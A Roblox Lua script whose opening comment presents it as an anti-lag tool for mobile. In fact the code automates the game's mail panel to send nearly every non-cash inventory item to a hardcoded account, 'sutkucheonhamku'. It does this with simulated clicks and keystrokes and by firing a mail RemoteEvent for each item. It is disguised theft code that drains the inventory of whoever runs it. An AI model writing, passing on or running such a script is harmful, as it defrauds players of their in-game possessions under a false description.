-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB V2: TỐI ƯU GÕ TÊN & NHẤP Ô ĐẦU TIÊN ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" 
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Hàm click chuẩn tâm ô
local function virtualClick(element)
    if element and element:IsA("GuiObject") and element.AbsolutePosition then
        local centerX = element.AbsolutePosition.X + (element.AbsoluteSize.X / 2)
        local centerY = element.AbsolutePosition.Y + (element.AbsoluteSize.Y / 2) + 36
        VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
        task.wait(0.05)
        VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
        task.wait(0.3)
        return true
    end
    return false
end

-- Hàm gõ chữ
local function virtualTypeString(text)
    for i = 1, #text do
        local char = string.sub(text, i, i)
        local keyCode = Enum.KeyCode[string.upper(char)]
        if keyCode then
            VirtualInputManager:SendKeyEvent(true, keyCode, false, game)
            task.wait(0.03)
            VirtualInputManager:SendKeyEvent(false, keyCode, false, game)
            task.wait(0.03)
        end
    end
    task.wait(0.2)
    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
    task.wait(0.5)
end

task.spawn(function()
    -- Lấy bảng Mail đang mở
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    local mailFrame = nil
    for _, gui in pairs(PlayerGui:GetDescendants()) do
        if (gui:IsA("Frame") or gui:IsA("ImageLabel")) and string.find(string.lower(gui.Name), "mail") and gui.Visible == true then
            mailFrame = gui
            break
        end
    end

    if mailFrame then
        -- 1. Tìm ô Search
        local searchBox = nil
        for _, child in pairs(mailFrame:GetDescendants()) do
            if child:IsA("TextBox") and child.Visible == true then
                searchBox = child
                break
            end
        end
        
        if searchBox then
            virtualClick(searchBox)
            task.wait(0.3)
            searchBox.Text = "" 
            virtualTypeString(targetUsername)
            task.wait(1.5) -- Chờ game đẩy nick lên đầu
        end

        -- 2. TỐI ƯU: NHẤP VÀO Ô ĐẦU TIÊN TRONG DANH SÁCH (Kết quả tìm kiếm)
        -- Dựa vào ảnh 1000017959.jpg, các ô nick nằm trong một danh sách cuộn (ScrollingFrame)
        local scrollFrame = mailFrame:FindFirstChildWhichIsA("ScrollingFrame", true)
        if scrollFrame then
            local results = scrollFrame:GetChildren()
            -- Lấy phần tử đầu tiên (thường là ô nick chính khi search đúng tên)
            for _, child in pairs(results) do
                if child:IsA("GuiObject") and child.Visible == true then
                    print("[SPEED HUB] Nhấp vào ô kết quả đầu tiên...")
                    virtualClick(child)
                    task.wait(0.8)
                    break
                end
            end
        end

        -- 3. Gửi đồ siêu tốc như cũ
        local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        local MailEvent = nil
        for _, obj in pairs(game:GetDescendants()) do
            if obj:IsA("RemoteEvent") and (string.find(string.lower(obj.Name), "mail") or string.find(string.lower(obj.Name), "send")) then
                MailEvent = obj
                break
            end
        end
        
        if Inventory and MailEvent then
            for _, item in pairs(Inventory:GetDescendants()) do
                if item:IsA("ValueBase") and item.Value and item.Value > 0 then
                    if not string.find(string.lower(item.Name), "cash") then
                        pcall(function() MailEvent:FireServer(targetUsername, item.Name, math.min(item.Value, 20)) end)
                    end
                end
            end
            print("[SPEED HUB] ==== ĐÃ HOÀN TẤT GÕ TÊN VÀ GỬI SIÊU TỐC! ====")
        end
    end
end)
